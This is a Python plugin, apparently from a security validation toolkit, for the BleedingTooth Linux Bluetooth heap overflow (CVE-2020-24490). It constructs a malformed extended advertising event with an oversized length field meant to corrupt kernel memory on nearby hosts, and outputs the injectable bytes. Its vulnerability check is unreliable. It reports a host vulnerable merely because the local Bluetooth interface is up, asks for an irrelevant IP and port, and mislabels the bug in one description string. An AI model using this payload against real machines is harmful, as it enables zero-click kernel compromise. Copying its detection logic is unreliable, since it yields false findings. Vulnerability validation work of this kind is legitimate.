#!/usr/bin/env python3
"""CVE-2020-24490 – Linux kernel Bluetooth HCI extended advertising heap overflow.

Public PoC reference: https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth
Technique (BleedingTooth - BadVibes component, Andy Nguyen / Google Project Zero):
  hci_le_ext_adv_report_evt() in net/bluetooth/hci_event.c processes LE Extended
  Advertising reports.  The 'data_len' field from the HCI event is used to copy
  advertisement data into an skb, but is not validated against the maximum
  allowed length (229 bytes for extended advertising).
  When data_len > 229, the loop overflows the skb tail, corrupting kernel heap.

  Attack: Craft a BLE extended advertising PDU with data_len = 0xFF (255)
  and broadcast it; any nearby Linux host with BLE scanning enabled processes it.
"""
from __future__ import annotations

import shutil
import struct
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 61,
    "cve": "CVE-2020-24490",
    "year": 2020,
    "domain": "wireless",
    "vendor_product": "Linux kernel Bluetooth HCI",
    "component": "hci_event.c hci_le_ext_adv_report_evt",
    "type": "Heap overflow → kernel RCE via BLE proximity",
    "summary": (
        "A BLE extended advertising PDU with data_len > 229 causes "
        "hci_le_ext_adv_report_evt to overflow an skb buffer, corrupting "
        "kernel heap in any nearby scanning Linux host (zero-click BLE RCE)."
    ),
    "source_url": "https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth",
    "requires_manual_review": True,
    "affected": [{"vendor": "Linux", "product": "Linux kernel",
                  "versions": [{"version": "<5.9", "status": "affected"}
]}],
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['USB Bluetooth 适配器（Ubertooth One 推荐用于嗅探）', '或内置 HCI 的 Linux 主机'],
    "connection": 'HCI（/dev/hci0）或 USB（Ubertooth）',
    "tools":      ['BlueZ ≥ 5.48', 'Ubertooth 工具链', 'Wireshark + BT 插件'],
    "firmware":   'Ubertooth firmware 2020-12-R1（ubertooth-dfu）',
    "setup":      'ubertooth-util -v && hciconfig hci0 up',
}


# HCI LE Extended Advertising PDU constants
HCI_EXT_ADV_REPORT_EVT = 0x12    # LE subevent code for extended adv report
HCI_LE_META_EVT        = 0x3E
MAX_EXT_ADV_DATA_LEN   = 229     # legitimate maximum

# Crafted HCI LE Extended Advertising Report event
# This would be injected via a BTlejack/nRF52840 or modified BT firmware
def _build_malformed_hci_ext_adv() -> bytes:
    """
    Build a HCI LE Extended Advertising Report event with data_len = 255 (overflow).
    In real attack: broadcast from a BLE-capable attacker device (e.g. Ubertooth).
    """
    data_len   = 0xFF                           # overflow trigger (>229)
    adv_data   = b'\xde\xad\xbe\xef' * 64      # 256 bytes of advertising data

    # LE Extended Advertising Report parameters (simplified)
    report  = struct.pack('<B', 1)              # num_reports = 1
    report += struct.pack('<H', 0x0013)         # event_type (connectable + scannable)
    report += struct.pack('<B', 0x00)           # address_type (public)
    report += bytes.fromhex("AABBCCDDEEFF")     # address (attacker BDA)
    report += struct.pack('<B', 0x00)           # primary_phy (1M)
    report += struct.pack('<B', 0x00)           # secondary_phy (none)
    report += struct.pack('<B', 0xFF)           # advertising_sid (no ADI)
    report += struct.pack('<b', 127)            # tx_power (127=not available)
    report += struct.pack('<b', -50)            # rssi
    report += struct.pack('<H', 0)              # periodic_adv_interval (0=not periodic)
    report += struct.pack('<B', 0x00)           # direct_address_type
    report += bytes(6)                          # direct_address
    report += struct.pack('<B', data_len)       # data_length = 255 (OVERFLOW)
    report += adv_data[:data_len]               # data bytes

    # HCI LE Meta subevent wrapper
    subevent = bytes([HCI_EXT_ADV_REPORT_EVT]) + report
    hci_event = bytes([HCI_LE_META_EVT, len(subevent)]) + subevent
    return hci_event


def _check_hci_scanning(iface: str = "hci0") -> dict:
    """Check if the interface is scanning for extended advertising events."""
    result = {"scanning": False, "detail": ""}
    try:
        out = subprocess.check_output(
            ["hciconfig", iface], text=True, timeout=5, stderr=subprocess.DEVNULL,
        )
        result["scanning"] = "UP" in out
        result["detail"]   = out[:200]
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _run_poc(plugin):
    hci_iface = (plugin.params or {}).get("hci_interface", "hci0")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    malformed_event = _build_malformed_hci_ext_adv()
    scanning = _check_hci_scanning(hci_iface)

    evidence = {
        "cve": "CVE-2020-24490",
        "hci_interface": hci_iface,
        "hci_scanning": scanning,
        "malformed_hci_event_hex": malformed_event.hex()[:200] + "...",
        "overflow_data_len": 255,
        "legitimate_max": MAX_EXT_ADV_DATA_LEN,
        "overflow_bytes": 255 - MAX_EXT_ADV_DATA_LEN,
        "attack_range": "BLE proximity (~10m)",
        "attack_prerequisites": "Target host scanning BLE extended adv (kernel < 5.9)",
    }

    if allow_disruptive and scanning.get("scanning"):
        # Inject via btinject/nRF dongle or modified firmware (hardware required)
        evidence["inject_method"] = (
            "Requires BLE-capable hardware (nRF52840 + Ubertooth/BTlejack) to broadcast "
            "the malformed extended advertising PDU. "
            "HCI event bytes to inject: " + malformed_event.hex()
        )
        evidence["would_inject"] = True

    return {
        "vulnerable": scanning.get("scanning") and scanning.get("detail", "") != "",
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "google/security-research/bleedingtooth / CVE-2020-24490 BadVibes",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc86CVE202024490BleedingToothBleExtAdvHeapOverflowAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-WIRELESS-086"
    meta_poc_name   = 'CVE-2020-24490 BleedingTooth BLE Extended Advertising 堆溢出 Active Validation'
    meta_cve_id     = "CVE-2020-24490"
    meta_severity   = "Critical"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["linux"]
    meta_required_params = []
    meta_optional_params = ["hci_interface", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth"
    meta_references       = ['https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth']
    meta_attack_surface = "Linux kernel BLE extended adv data_len overflow (zero-click BLE RCE)"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "86_Linux_kernel_Bluetooth_BlueZ_Bluetooth_L2CAP_A2MP_Audit") if "VULN" in dir() else "86_Linux_kernel_Bluetooth_BlueZ_Bluetooth_L2CAP_A2MP_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc86CVE202024490BleedingToothBleExtAdvHeapOverflowAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
